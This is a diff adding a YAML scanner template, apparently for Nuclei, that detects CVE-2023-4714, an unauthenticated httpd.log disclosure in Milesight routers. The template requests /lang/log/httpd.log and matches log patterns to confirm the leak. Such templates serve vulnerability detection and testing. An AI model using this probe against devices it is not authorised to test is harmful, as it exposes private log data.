@@ -1,0 +1,29 @@
+id: poc-yaml-milesight-router-httpdlog-information-leak
+info:
+  name: Milesight Router httpd.log Information Leak Vulnerability (CVE-2023-4714)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-leak,cve-2023-4714
+  description: |
+    The Milesight Router contains an information disclosure vulnerability that allows unauthenticated access to the 'httpd.log' file, potentially exposing sensitive data.
+
+http:
+  - method: GET
+    path:
+      - /lang/log/httpd.log
+    headers:
+      Content-Type: application/json
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}"
+          - "\\d+\\.\\d+\\.\\d+\\.\\d+:"
+      - type: word
+        words:
+          - "Not Loggined in"
+          - "rtver"
+          - "ysrole"
